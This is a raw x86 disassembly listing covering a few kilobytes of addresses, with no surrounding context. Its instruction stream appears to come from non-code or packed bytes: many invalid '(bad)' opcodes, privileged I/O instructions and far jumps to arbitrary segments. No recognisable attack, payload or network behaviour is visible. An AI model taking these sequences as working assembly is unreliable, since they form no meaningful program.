  41ee85:	cmp    bh,BYTE PTR [edx]
  41ee87:	pop    ebp
  41ee88:	sbb    al,0x5b
  41ee8a:	xchg   edx,eax
  41ee8b:	dec    esi
  41ee8c:	test   BYTE PTR [eax+0x146d0551],0xc0
  41ee93:	je     0x41ee5e
  41ee95:	cmp    ch,ah
  41ee97:	pop    ecx
  41ee98:	sbb    ah,ah
  41ee9a:	pop    edi
  41ee9b:	cmp    edi,DWORD PTR [edx]
  41ee9d:	xchg   DWORD PTR [edx],ebp
  41ee9f:	popa   
  41eea0:	fbld   TBYTE PTR [ebx-0x766ec4c7]
  41eea6:	shl    DWORD PTR [esi],1
  41eea8:	jmp    0xa8a85935
  41eead:	into   
  41eeae:	push   esp
  41eeaf:	hlt    
  41eeb0:	pop    esi
  41eeb1:	shl    BYTE PTR [esi],cl
  41eeb3:	push   cs
  41eeb4:	sub    DWORD PTR fs:[ebx-0x2628a9cc],eax
  41eebb:	jp     0x41ee72
  41eebd:	mov    ?,WORD PTR [esi+eiz*1-0x4d50049]
  41eec4:	jne    0x41ee46
  41eec6:	push   ecx
  41eec7:	ja     0x41ee64
  41eec9:	xor    al,0x72
  41eecb:	(bad)  
  41eecc:	sbb    ecx,ebx
  41eece:	push   0xeced93ac
  41eed3:	les    esp,FWORD PTR [ecx+0x3c]
  41eed6:	jl     0x41eef9
  41eed8:	in     eax,0x8a
  41eeda:	pop    eax
  41eedb:	cmp    bh,BYTE PTR [ebp-0x1656bf9c]
  41eee1:	dec    esp
  41eee2:	xor    dl,BYTE PTR [ecx+edx*1+0x7349960b]
  41eee9:	cmp    al,0xdb
  41eeeb:	adc    al,0xd
  41eeed:	sbb    BYTE PTR [esp+edi*4+0x51],ah
  41eef1:	inc    edi
  41eef2:	fdivrp st(0),st
  41eef4:	jnp    0x41eee2
  41eef6:	mov    edi,0x12955435
  41eefb:	adc    eax,0xf61f08a3
  41ef00:	sub    eax,0x5dbd58a4
  41ef05:	pushf  
  41ef06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef07:	pop    esi
  41ef08:	mov    ds:0xa19211a1,eax
  41ef0d:	sbb    eax,0xbcce7544
  41ef12:	adc    BYTE PTR [esi],0xbe
  41ef15:	push   0x2d
  41ef17:	sbb    ah,ch
  41ef19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef1a:	in     al,0x0
  41ef1c:	ret    
  41ef1d:	push   eax
  41ef1e:	cmp    dl,ah
  41ef20:	mov    esi,0x3fb77d92
  41ef25:	retf   0x52f1
  41ef28:	cmc    
  41ef29:	je     0x41ef29
  41ef2b:	xlat   BYTE PTR ds:[ebx]
  41ef2c:	xchg   DWORD PTR [edi+0x6e48c16],esi
  41ef32:	pop    edx
  41ef33:	mov    al,ds:0x114b278b
  41ef38:	cli    
  41ef39:	retf   0xba9c
  41ef3c:	or     BYTE PTR [ebx+0x23527f09],0x5c
  41ef43:	xchg   ecx,eax
  41ef44:	cwde   
  41ef45:	cwde   
  41ef46:	or     al,0xfc
  41ef48:	xor    dh,BYTE PTR [eax+0x2f9269c9]
  41ef4e:	arpl   WORD PTR [esi-0x61],ax
  41ef51:	push   ecx
  41ef52:	mov    DWORD PTR [eax],eax
  41ef54:	test   eax,0x8f238f30
  41ef59:	jae    0x41ef60
  41ef5b:	mov    dl,BYTE PTR [esi]
  41ef5d:	test   al,0x6f
  41ef5f:	std    
  41ef60:	mov    DWORD PTR [ebp-0x2d],esp
  41ef63:	retf   0x3e2e
  41ef66:	in     al,dx
  41ef67:	fcmovu st,st(1)
  41ef69:	xchg   ebx,eax
  41ef6a:	mov    al,0xac
  41ef6c:	int    0xe5
  41ef6e:	pop    ecx
  41ef6f:	test   DWORD PTR [esi],esp
  41ef71:	pop    esp
  41ef72:	xor    al,0xae
  41ef74:	shr    BYTE PTR [eax],1
  41ef76:	sub    BYTE PTR [ecx-0x2e7ac0ec],bl
  41ef7c:	push   cs
  41ef7d:	stos   DWORD PTR es:[edi],eax
  41ef7e:	jmp    0x41effe
  41ef80:	int3   
  41ef81:	jo     0x41ef9a
  41ef83:	retf   0xd155
  41ef86:	in     al,dx
  41ef87:	inc    ebx
  41ef88:	cli    
  41ef89:	dec    esp
  41ef8a:	inc    ecx
  41ef8b:	pop    ebx
  41ef8c:	les    esi,FWORD PTR [ebp-0x6f]
  41ef8f:	mov    edi,0xb9fc8d7b
  41ef94:	mov    esp,0xd4265977
  41ef99:	iret   
  41ef9a:	mov    edx,0x3ba0ac92
  41ef9f:	in     eax,0xba
  41efa1:	sbb    eax,0x4d342598
  41efa6:	enter  0x9c8,0x27
  41efaa:	cmp    eax,0xceb33a6
  41efaf:	or     BYTE PTR [edi-0x6a],ch
  41efb2:	popa   
  41efb3:	mov    edx,0xb22fa91b
  41efb8:	or     esp,DWORD PTR [eax]
  41efba:	inc    ecx
  41efbb:	xor    esi,esp
  41efbd:	dec    eax
  41efbe:	mov    dl,BYTE PTR [edx-0x80]
  41efc1:	jbe    0x41ef88
  41efc3:	add    bh,BYTE PTR [edx-0xe]
  41efc6:	xor    DWORD PTR [edi-0x48],edi
  41efc9:	(bad)  
  41efcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efcc:	enter  0xdde9,0x3a
  41efd0:	mov    bh,0x4f
  41efd2:	loope  0x41efee
  41efd4:	out    0x65,al
  41efd6:	add    dl,BYTE PTR [esi]
  41efd8:	xor    al,BYTE PTR [bx+di+0x76]
  41efdc:	(bad)  
  41efdd:	je     0x41ef7d
  41efdf:	aas    
  41efe0:	sub    DWORD PTR [ebp-0x3311293c],eax
  41efe6:	push   ecx
  41efe7:	jb     0x41f052
  41efe9:	push   ebp
  41efea:	bound  ebp,QWORD PTR [edx+0x44]
  41efed:	dec    edx
  41efee:	gs jmp 0xf946:0x3d95e9ea
  41eff6:	and    ebx,DWORD PTR [eax]
  41eff8:	mov    esp,0x97f6f50c
  41effd:	push   0xffffff9e
  41efff:	cmp    eax,0xec09ab47
  41f004:	xor    ebx,DWORD PTR [esi+0x2c712522]
  41f00a:	(bad)  
  41f00b:	jno    0x41f068
  41f00d:	dec    ebx
  41f00e:	es inc esp
  41f010:	retf   
  41f011:	adc    DWORD PTR [edx+0x7d],edi
  41f014:	push   ss
  41f015:	jae    0x41f088
  41f017:	repz jnp 0x41f040
  41f01a:	mov    edx,DWORD PTR [ebx+0x7ee00603]
  41f020:	scas   eax,DWORD PTR es:[edi]
  41f021:	mov    ecx,esi
  41f023:	inc    ecx
  41f024:	and    al,0x5e
  41f026:	cli    
  41f027:	popa   
  41f028:	jmp    0xb33d:0xdb0d594b
  41f02f:	out    0x3f,al
  41f031:	test   DWORD PTR [edi+0xb4e0056],ecx
  41f037:	xchg   edx,eax
  41f038:	call   0x5c0b7854
  41f03d:	fiadd  WORD PTR [edx]
  41f03f:	stos   BYTE PTR es:[edi],al
  41f040:	jbe    0x41f0a1
  41f042:	(bad)  
  41f043:	ja     0x41f045
  41f045:	call   0xec42d468
  41f04a:	mov    cl,BYTE PTR ds:[edx+0x2120807a]
  41f051:	push   es
  41f052:	xchg   esp,eax
  41f053:	push   eax
  41f054:	cwde   
  41f055:	push   0x1c88f628
  41f05a:	enter  0x2fa9,0xf3
  41f05e:	outs   dx,BYTE PTR ds:[esi]
  41f05f:	aam    0x76
  41f061:	dec    eax
  41f062:	jmp    FWORD PTR [ecx+0x1b4004d3]
  41f068:	mov    ds:0x1f22c4f5,eax
  41f06d:	leave  
  41f06e:	dec    eax
  41f06f:	xor    eax,0xb2673b39
  41f074:	popa   
  41f075:	xor    dl,BYTE PTR [eax]
  41f077:	jecxz  0x41f034
  41f079:	sub    DWORD PTR [edi+0x552c4fec],0x64
  41f080:	jnp    0x41f030
  41f082:	xor    al,0xa3
  41f084:	fdivr  st(5),st
  41f086:	mov    ah,0x36
  41f088:	ss pop edi
  41f08a:	inc    eax
  41f08b:	sbb    BYTE PTR [edi-0x1f],bh
  41f08e:	pop    ds
  41f08f:	fs jmp 0xabaf:0x5f4c5f0a
  41f097:	daa    
  41f098:	and    al,bl
  41f09a:	pop    esp
  41f09b:	sbb    ecx,ebp
  41f09d:	into   
  41f09e:	sbb    eax,0x67535b58
  41f0a3:	ss cmc 
  41f0a5:	stos   BYTE PTR es:[edi],al
  41f0a6:	mov    bh,0xce
  41f0a8:	mov    cs,WORD PTR [esi]
  41f0aa:	sub    ecx,ecx
  41f0ac:	arpl   di,ax
  41f0ae:	(bad)  
  41f0af:	aas    
  41f0b0:	leave  
  41f0b1:	xchg   BYTE PTR [ebx],ah
  41f0b3:	adc    esp,DWORD PTR [edi+0x7a]
  41f0b6:	stos   DWORD PTR es:[edi],eax
  41f0b7:	xor    ebp,DWORD PTR ds:0x711ba7e3
  41f0bd:	fcmovbe st,st(4)
  41f0bf:	push   0x78f3b7c7
  41f0c4:	pop    ebx
  41f0c5:	push   esp
  41f0c6:	xchg   ebp,eax
  41f0c7:	jle    0x41f0e6
  41f0c9:	es cdq 
  41f0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0cc:	cmp    edx,edi
  41f0ce:	jmp    0x8e49:0xa9ecdae1
  41f0d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0d6:	neg    BYTE PTR [esi-0x33]
  41f0d9:	pop    ecx
  41f0da:	test   al,0xf2
  41f0dc:	mov    dh,0xde
  41f0de:	aam    0x2d
  41f0e0:	js     0x41f100
  41f0e2:	dec    esi
  41f0e3:	jle    0x41f069
  41f0e5:	loopne 0x41f15f
  41f0e7:	xchg   esp,eax
  41f0e8:	retf   
  41f0e9:	arpl   WORD PTR [edx],bp
  41f0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0ec:	inc    eax
  41f0ed:	add    al,0xfc
  41f0ef:	jbe    0x41f13d
  41f0f1:	call   0x64b45d54
  41f0f6:	or     eax,0x7f112394
  41f0fb:	retf   0x4567
  41f0fe:	and    BYTE PTR [edi+0xf],al
  41f101:	lods   al,BYTE PTR ds:[esi]
  41f102:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f103:	sti    
  41f104:	pop    ss
  41f105:	jmp    FWORD PTR [esi+esi*4+0x37e2a950]
  41f10c:	retf   0x8024
  41f10f:	mov    ch,0xec
  41f111:	jno    0x41f168
  41f113:	jecxz  0x41f135
  41f115:	inc    ecx
  41f116:	mov    ds:0x1431687f,al
  41f11b:	inc    eax
  41f11c:	xchg   esp,eax
  41f11d:	rep lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f120:	mov    cl,0x50
  41f122:	dec    esi
  41f123:	out    0xd9,eax
  41f125:	out    0xa0,al
  41f127:	pop    edi
  41f128:	xor    al,0xbf
  41f12a:	mov    ebp,0x39bb71d3
  41f12f:	cs xchg edx,eax
  41f131:	xchg   DWORD PTR [ecx+0x2],eax
  41f134:	jmp    0x41f131
  41f136:	sub    edx,DWORD PTR [esi]
  41f138:	add    ebx,eax
  41f13a:	inc    ebx
  41f13b:	gs (bad) 
  41f13d:	lods   eax,DWORD PTR ds:[esi]
  41f13e:	cmp    DWORD PTR [ecx-0xd37511d],edi
  41f144:	add    al,0xba
  41f146:	lods   eax,DWORD PTR ds:[esi]
  41f147:	mov    edx,0x56d97bae
  41f14c:	cld    
  41f14d:	mov    eax,0x2a9a5fa7
  41f152:	in     al,0xed
  41f154:	xchg   edi,eax
  41f155:	in     eax,dx
  41f156:	inc    esp
  41f157:	cdq    
  41f158:	cwde   
  41f159:	(bad)  
  41f15a:	mov    edx,DWORD PTR [edx-0x7c4b6c5c]
  41f160:	(bad)  
  41f161:	cli    
  41f162:	in     eax,0x45
  41f164:	pop    ebx
  41f165:	in     al,0x5c
  41f167:	lods   al,BYTE PTR ds:[esi]
  41f168:	pop    ebp
  41f169:	push   esp
  41f16a:	jns    0x41f0f7
  41f16c:	sbb    al,0x69
  41f16e:	mov    bl,0xb3
  41f170:	xchg   BYTE PTR [edi+0x7d],bl
  41f173:	pop    ss
  41f174:	jmp    0x2c55e376
  41f179:	and    DWORD PTR [ecx+0x683af4cb],0x47
  41f180:	ret    0xa6bc
  41f183:	pop    es
  41f184:	out    dx,eax
  41f185:	fidivr WORD PTR [edi-0x4424c9b6]
  41f18b:	fwait
  41f18c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f18d:	lods   al,BYTE PTR ds:[esi]
  41f18e:	popa   
  41f18f:	mov    esi,0x3064efa3
  41f194:	popa   
  41f195:	repnz add eax,esp
  41f198:	mov    cl,0x1e
  41f19a:	or     edi,edx
  41f19c:	sbb    eax,0x5396408d
  41f1a1:	dec    edi
  41f1a2:	inc    eax
  41f1a3:	out    0xf1,eax
  41f1a5:	mov    dl,0x36
  41f1a7:	jno    0x41f187
  41f1a9:	out    dx,eax
  41f1aa:	call   0xd51e:0x3fa2e81e
  41f1b1:	clc    
  41f1b2:	mov    edi,0x8293a4ce
  41f1b7:	mov    ds:0xa4347719,al
  41f1bc:	push   esp
  41f1bd:	outs   dx,BYTE PTR ds:[esi]
  41f1be:	pop    esi
  41f1bf:	shl    dl,1
  41f1c1:	cdq    
  41f1c2:	fst    QWORD PTR [ecx]
  41f1c4:	lock retf 
  41f1c6:	sbb    ecx,ecx
  41f1c8:	das    
  41f1c9:	jne    0x41f1ad
  41f1cb:	jmp    DWORD PTR ss:[ecx]
  41f1ce:	add    dl,BYTE PTR [esi+esi*4]
  41f1d1:	adc    BYTE PTR [esp+ebx*2+0x3126ce4b],al
  41f1d8:	push   ds
  41f1d9:	cs out 0xb5,eax
  41f1dc:	shr    BYTE PTR [esi],0xb7
  41f1df:	pop    ebx
  41f1e0:	ds daa 
  41f1e2:	mov    ss,edx
  41f1e4:	or     al,0xf7
  41f1e6:	adc    eax,0x81e42716
  41f1eb:	mov    cl,0xb4
  41f1ed:	js     0x41f259
  41f1ef:	sub    BYTE PTR [ecx],bl
  41f1f1:	or     al,0xa3
  41f1f3:	out    dx,al
  41f1f4:	pop    eax
  41f1f5:	neg    BYTE PTR [ebx+edi*2+0x51]
  41f1f9:	dec    esp
  41f1fa:	push   ebx
  41f1fb:	inc    ebp
  41f1fc:	mov    WORD PTR [ebx+eax*1],gs
  41f1ff:	shr    DWORD PTR [ebx+edi*1-0x36],1
  41f203:	call   0xe1ed:0x47a09420
  41f20a:	loope  0x41f1ef
  41f20c:	push   0xb297209f
  41f211:	pop    ebp
  41f212:	nop
  41f213:	cdq    
  41f214:	jmp    0x41f280
  41f216:	(bad)  
  41f217:	adc    al,0x93
  41f219:	sub    eax,0x7efae62
  41f21e:	je     0x41f23f
  41f220:	mov    esi,0xfb21aa3e
  41f225:	enter  0xf3e2,0x53
  41f229:	push   ebp
  41f22a:	repnz cdq 
  41f22c:	xchg   edx,eax
  41f22d:	retf   0xc8ca
  41f230:	imul   edx,DWORD PTR [edi-0x13],0xc37d37ca
  41f237:	lock mov ch,0x81
  41f23a:	sar    ebx,0x9b
  41f23d:	ds in  al,0x86
  41f240:	aas    
  41f241:	sub    bl,BYTE PTR [esi]
  41f243:	div    BYTE PTR [ebp*1+0x5355a21a]
  41f24a:	push   0x53074ee
  41f24f:	mov    bl,0xe9
  41f251:	push   edx
  41f252:	into   
  41f253:	mov    al,0x54
  41f255:	push   ss
  41f256:	stos   DWORD PTR es:[edi],eax
  41f257:	jp     0x41f2b0
  41f259:	jb     0x41f1e7
  41f25b:	cmp    esp,DWORD PTR [eax+0x4f0dbb7e]
  41f261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f262:	add    ecx,ecx
  41f264:	enter  0x5334,0x50
  41f268:	(bad)  
  41f269:	jb     0x41f260
  41f26b:	and    ch,BYTE PTR [ebx+0x6b]
  41f26e:	pop    ebp
  41f26f:	sbb    al,0x51
  41f271:	and    al,0xce
  41f273:	test   eax,0xb83e509a
  41f278:	xlat   BYTE PTR es:[ebx]
  41f27a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f27b:	sub    BYTE PTR [esi+0x785b1a0f],cl
  41f281:	push   0xffffffa6
  41f283:	stos   DWORD PTR es:[edi],eax
  41f284:	push   ebx
  41f285:	and    eax,0x1db951f4
  41f28a:	inc    ebx
  41f28b:	retf   0xa187
  41f28e:	and    eax,0x2f92ec3f
  41f293:	or     ebp,0x3c
  41f296:	mov    ss,ecx
  41f298:	(bad)  
  41f299:	dec    edx
  41f29a:	std    
  41f29b:	adc    eax,0xf82abb1a
  41f2a0:	jle    0x41f26f
  41f2a2:	xchg   edi,eax
  41f2a3:	jmp    0x41f290
  41f2a5:	les    esp,FWORD PTR [ebp+0xb]
  41f2a8:	mov    cl,0xf8
  41f2aa:	sbb    DWORD PTR [ecx+0x55150162],0xb70653a0
  41f2b4:	arpl   WORD PTR [edi-0x45136358],bx
  41f2ba:	push   es
  41f2bb:	ja     0x41f2a2
  41f2bd:	xor    al,0xfd
  41f2bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2c0:	dec    ecx
  41f2c1:	and    DWORD PTR [ecx],0xffffff82
  41f2c4:	addr16 mov eax,ebx
  41f2c7:	jmp    0x1296:0x526003e8
  41f2ce:	pop    es
  41f2cf:	cwde   
  41f2d0:	xchg   edx,eax
  41f2d1:	mov    ebp,0x217f4d3
  41f2d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2d7:	outs   dx,BYTE PTR ds:[esi]
  41f2d8:	inc    esp
  41f2d9:	jmp    0xbe1bcc65
  41f2de:	in     eax,dx
  41f2df:	lea    ebx,[esp+edi*2]
  41f2e2:	add    al,0xd
  41f2e4:	mov    DWORD PTR [esi+esi*2],edx
  41f2e7:	ret    0x7fe1
  41f2ea:	adc    ch,BYTE PTR [edx+0x4f]
  41f2ed:	and    edx,DWORD PTR [esi]
  41f2ef:	outs   dx,BYTE PTR ds:[esi]
  41f2f0:	pop    ebx
  41f2f1:	(bad)  [esi-0x43]
  41f2f4:	xchg   ebp,eax
  41f2f5:	adc    BYTE PTR [eax-0x79],bl
  41f2f8:	jp     0x41f29c
  41f2fa:	mov    esi,0x86b9a0ff
  41f2ff:	out    0xdd,al
  41f301:	inc    ebp
  41f302:	fcomi  st,st(2)
  41f304:	dec    eax
  41f305:	data16 out 0x7f,al
  41f308:	mov    bh,0x65
  41f30a:	icebp  
  41f30b:	shl    edi,1
  41f30d:	cs jbe 0x41f38f
  41f310:	and    eax,0x86cbaccb
  41f315:	push   ss
  41f316:	xchg   edi,eax
  41f317:	xchg   DWORD PTR [eax+0x408487d8],ebx
  41f31d:	ins    DWORD PTR es:[edi],dx
  41f31e:	xlat   BYTE PTR ds:[ebx]
  41f31f:	ficom  WORD PTR [esi]
  41f321:	sub    ecx,DWORD PTR [eax+0x5509ede4]
  41f327:	jmp    0x41f2ca
  41f329:	or     dh,0xa0
  41f32c:	sti    
  41f32d:	stc    
  41f32e:	push   es
  41f32f:	mov    gs,ebp
  41f331:	mov    ch,0x9c
  41f333:	gs hlt 
  41f335:	gs or  al,0x3e
  41f338:	mov    esi,0xd3f1e5f0
  41f33d:	add    esp,DWORD PTR [edx]
  41f33f:	or     DWORD PTR fs:[ebx],esi
  41f342:	in     al,0x5a
  41f344:	test   al,0x35
  41f346:	xchg   edi,eax
  41f347:	loopne 0x41f359
  41f349:	xchg   ebx,eax
  41f34a:	cs or  al,dh
  41f34d:	fcom   DWORD PTR [esi]
  41f34f:	inc    edx
  41f350:	cs mov cl,al
  41f353:	test   al,0x78
  41f355:	pop    ebx
  41f356:	out    dx,al
  41f357:	cmp    al,0xac
  41f359:	cdq    
  41f35a:	rol    edi,0xa
  41f35d:	mov    ds:0xef58421a,al
  41f362:	and    DWORD PTR [ecx-0x9],0xb72629dc
  41f369:	fisubr DWORD PTR [esi+0xaeaa386]
  41f36f:	push   ebx
  41f370:	into   
  41f371:	loope  0x41f335
  41f373:	mov    al,ds:0x743f8128
  41f378:	lahf   
  41f379:	and    ecx,0xffffffd8
  41f37c:	mov    edi,0xfe3fd84b
  41f381:	jmp    FWORD PTR [ecx+edi*1]
  41f384:	xchg   esp,eax
  41f385:	fwait
  41f386:	xchg   edx,eax
  41f387:	add    DWORD PTR [edx+0x2a53c6c8],esi
  41f38d:	push   0x460b573a
  41f392:	fld    DWORD PTR fs:[esi]
  41f395:	and    eax,0x282381ce
  41f39a:	shr    DWORD PTR [esi+0x1b],cl
  41f39d:	test   eax,0x86c4dad6
  41f3a2:	aam    0xa7
  41f3a4:	(bad)  
  41f3a5:	and    ecx,DWORD PTR [ebx+0x67]
  41f3a8:	inc    edx
  41f3a9:	popf   
  41f3aa:	mov    eax,0xb5c094cb
  41f3af:	mov    WORD PTR [ebx-0x72b0aadc],cs
  41f3b5:	retf   0x418c
  41f3b8:	pop    ss
  41f3b9:	sbb    edi,esi
  41f3bb:	loopne 0x41f421
  41f3bd:	iret   
  41f3be:	test   DWORD PTR [ecx+0x19],edx
  41f3c1:	ret    0xc88
  41f3c4:	stos   BYTE PTR es:[edi],al
  41f3c5:	stc    
  41f3c6:	mov    ebx,0xf32ddd06
  41f3cb:	mov    dl,BYTE PTR [edx+0xc7a1e90]
  41f3d1:	pop    ss
  41f3d2:	hlt    
  41f3d3:	push   esi
  41f3d4:	mov    ebp,0xd3ebbda4
  41f3d9:	sti    
  41f3da:	(bad)  
  41f3db:	stos   DWORD PTR es:[edi],eax
  41f3dc:	pop    ebp
  41f3dd:	(bad)  
  41f3de:	mov    ecx,0xe9404dac
  41f3e3:	ds cmp al,0x16
  41f3e6:	jo     0x41f43d
  41f3e8:	dec    esi
  41f3e9:	pop    ebx
  41f3ea:	(bad)  
  41f3eb:	cli    
  41f3ec:	adc    DWORD PTR [ebp+0x62da8157],edi
  41f3f2:	fsub   DWORD PTR [eax+0x1f636c71]
  41f3f8:	xor    bh,al
  41f3fa:	xchg   edx,edi
  41f3fc:	fld    QWORD PTR [ecx+0x1f]
  41f3ff:	fidivr DWORD PTR [eax+0x4a]
  41f402:	push   ss
  41f403:	jmp    0x70cb:0x9dcd6fad
  41f40a:	es mov edx,0xd849781d
  41f410:	push   0x2addfbf
  41f415:	rol    DWORD PTR [edx-0x51],cl
  41f418:	aam    0x2
  41f41a:	pop    ebx
  41f41b:	adc    ebx,DWORD PTR ds:0x161d4b54
  41f421:	mul    DWORD PTR ds:0x6652c502
  41f427:	inc    eax
  41f428:	jae    0x41f493
  41f42a:	sub    BYTE PTR [esi+ebp*2+0x27cecbf7],bl
  41f431:	sub    al,0x97
  41f433:	inc    ebx
  41f434:	inc    edx
  41f435:	mov    ch,0x28
  41f437:	(bad)  [ebp+0x33]
  41f43a:	add    BYTE PTR [esi],cl
  41f43c:	mov    ah,0x9
  41f43e:	enter  0x5500,0xc
  41f442:	xchg   edi,edx
  41f444:	inc    ecx
  41f445:	popa   
  41f446:	sbb    al,0xbb
  41f448:	les    esi,FWORD PTR [edx+eiz*1-0x2d]
  41f44c:	out    0xe6,eax
  41f44e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f44f:	ret    
  41f450:	dec    esp
  41f451:	ret    0x418a
  41f454:	jmp    FWORD PTR [eax-0x58]
  41f457:	jmp    0x5928a168
  41f45c:	rcl    DWORD PTR [edx+0x4349e93c],0x4
  41f463:	mov    al,ds:0x2f0d128d
  41f468:	sbb    eax,0x8dfb6fc0
  41f46d:	shl    esp,1
  41f46f:	mov    eax,0x490b9909
  41f474:	ret    0xa8ef
  41f477:	out    dx,eax
  41f478:	je     0x41f403
  41f47a:	daa    
  41f47b:	out    dx,eax
  41f47c:	pop    esp
  41f47d:	mul    BYTE PTR [esi-0x2fcadba3]
  41f483:	xchg   edx,eax
  41f484:	sbb    al,dl
  41f486:	ja     0x41f41d
  41f488:	repz cmp ch,BYTE PTR [eax-0x12c10020]
  41f48f:	fs inc edi
  41f491:	aad    0x29
  41f493:	adc    DWORD PTR [eax+eax*1-0x241c4d8c],0x2bfe7d10
  41f49e:	or     esi,eax
  41f4a0:	cs stc 
  41f4a2:	mov    edi,0xc162305
  41f4a7:	int3   
  41f4a8:	inc    esp
  41f4a9:	call   0xc2b4:0xe373f623
  41f4b0:	test   al,0x6f
  41f4b2:	shl    BYTE PTR [esi],0x24
  41f4b5:	icebp  
  41f4b6:	and    DWORD PTR [ecx+eiz*1+0x68de7aba],ecx
  41f4bd:	dec    ebp
  41f4be:	or     ebx,DWORD PTR [eax]
  41f4c0:	js     0x41f46d
  41f4c2:	or     DWORD PTR [edi-0x14],0x3c
  41f4c6:	sub    al,0xe6
  41f4c8:	pushf  
  41f4c9:	cmp    ebp,DWORD PTR ds:0xe67516c8
  41f4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4d0:	nop
  41f4d1:	sub    DWORD PTR [ebp-0x2492524],edi
  41f4d7:	mov    dl,0x42
  41f4d9:	shl    BYTE PTR [esi+ecx*1+0x6140b789],0x3a
  41f4e1:	mov    esi,db6
  41f4e4:	or     ebp,DWORD PTR [ecx-0x4438c53b]
  41f4ea:	or     edx,DWORD PTR ds:0x5134f2c0
  41f4f0:	dec    edi
  41f4f1:	fmul   DWORD PTR [edi]
  41f4f3:	rcr    BYTE PTR [edi-0x4906f897],cl
  41f4f9:	pusha  
  41f4fa:	xor    BYTE PTR [ebp-0x15],al
  41f4fd:	push   eax
  41f4fe:	sbb    DWORD PTR [ebx+esi*1+0x61],0xbe10ed97
  41f506:	add    al,0x58
  41f508:	pop    edi
  41f509:	jmp    0x9ddfc74b
  41f50e:	aad    0xc9
  41f510:	inc    edx
  41f511:	invlpg BYTE PTR [edx+0x100ac19d]
  41f518:	mov    esp,0x67280290
  41f51d:	aas    
  41f51e:	retf   0xaefb
  41f521:	sbb    ch,BYTE PTR [eax+edi*8-0xc]
  41f525:	test   ecx,ebx
  41f527:	cmp    cl,BYTE PTR [edx+0x615837f]
  41f52d:	test   DWORD PTR [edx],esp
  41f52f:	jae    0x41f58e
  41f531:	test   BYTE PTR [ebx+ecx*1+0x30b1bf6b],0x7b
  41f539:	mov    ?,WORD PTR [ecx+edi*8+0x3a1ebd1e]
  41f540:	xchg   edx,eax
  41f541:	fs xchg ebx,eax
  41f543:	cli    
  41f544:	out    0xac,eax
  41f546:	jmp    0x41f520
  41f548:	cli    
  41f549:	sbb    eax,0x888cfa67
  41f54e:	mov    bl,0x9a
  41f550:	push   edi
  41f551:	xchg   esi,eax
  41f552:	and    esp,0xfffffff5
  41f555:	push   eax
  41f556:	and    esp,0xffffffe5
  41f559:	pop    es
  41f55a:	sub    dh,BYTE PTR [edi+0x38]
  41f55d:	js     0x41f531
  41f55f:	fiadd  WORD PTR [ebx+0x2c]
  41f562:	enter  0x86d7,0x7b
  41f566:	pop    edx
  41f567:	rcr    DWORD PTR [esp+eiz*4+0x7c2eebd],1
  41f56e:	push   0x27d4cc52
  41f573:	push   eax
  41f574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f575:	(bad)  
  41f576:	push   esi
  41f577:	aad    0x7e
  41f579:	xor    al,dl
  41f57b:	loop   0x41f5e7
  41f57d:	jo     0x41f5cb
  41f57f:	cmp    esi,eax
  41f581:	add    eax,0x4af06b8
  41f586:	rcr    BYTE PTR [ebx-0x63d55d20],1
  41f58c:	std    
  41f58d:	and    al,0xd6
  41f58f:	shr    BYTE PTR [edx],0xd6
  41f592:	push   edx
  41f594:	xor    al,0x37
  41f596:	arpl   WORD PTR [edi-0x272de303],dx
  41f59c:	mov    eax,0x6fea342b
  41f5a1:	or     al,0xbd
  41f5a3:	scas   eax,DWORD PTR es:[edi]
  41f5a4:	and    BYTE PTR [edx-0x5cc5c88],al
  41f5aa:	pop    eax
  41f5ab:	xchg   ebp,eax
  41f5ac:	sbb    BYTE PTR [edx+0x285b460b],bh
  41f5b2:	lock hlt 
  41f5b4:	sbb    edx,ecx
  41f5b6:	leave  
  41f5b7:	out    dx,al
  41f5b8:	jbe    0x41f547
  41f5ba:	pop    ss
  41f5bb:	and    BYTE PTR [ebx],dh
  41f5bd:	sub    DWORD PTR [edx-0x5286a7d9],eax
  41f5c3:	aad    0xf9
  41f5c5:	int    0x11
  41f5c7:	inc    edx
  41f5c8:	neg    BYTE PTR [ebx+0x70]
  41f5cb:	push   esi
  41f5cc:	inc    esi
  41f5cd:	out    dx,eax
  41f5ce:	sub    esi,edi
  41f5d0:	mov    ds:0x823ff665,al
  41f5d5:	xor    dh,al
  41f5d7:	pop    es
  41f5d8:	dec    edi
  41f5d9:	add    BYTE PTR [ecx],dl
  41f5db:	das    
  41f5dc:	mov    WORD PTR [ecx+0x4d],ds
  41f5df:	xchg   BYTE PTR [edi+0x6b956964],al
  41f5e5:	aas    
  41f5e6:	addr16 jne 0x41f575
  41f5e9:	dec    esi
  41f5ea:	inc    ebx
  41f5eb:	sti    
  41f5ec:	inc    ebp
  41f5ed:	xor    DWORD PTR ds:0x263c354e,0x53bb11d3
  41f5f7:	dec    edi
  41f5f8:	add    BYTE PTR [eax+0x79],dl
  41f5fb:	das    
  41f5fc:	les    ebx,FWORD PTR [eax-0x18]
  41f5ff:	mov    ebx,0x9fde55c5
  41f604:	sahf   
  41f605:	push   esp
  41f606:	mov    cl,0xc
  41f608:	icebp  
  41f609:	int3   
  41f60a:	arpl   bp,sp
  41f60c:	aad    0x43
  41f60e:	outs   dx,DWORD PTR ds:[esi]
  41f60f:	or     cl,bl
  41f611:	shl    DWORD PTR [edi+0x14],1
  41f614:	popf   
  41f615:	cdq    
  41f616:	enter  0x6dd,0x3d
  41f61a:	cli    
  41f61b:	cmc    
  41f61c:	jp     0x41f5c6
  41f61e:	mov    edi,0x5c7c3b85
  41f623:	pusha  
  41f624:	dec    edi
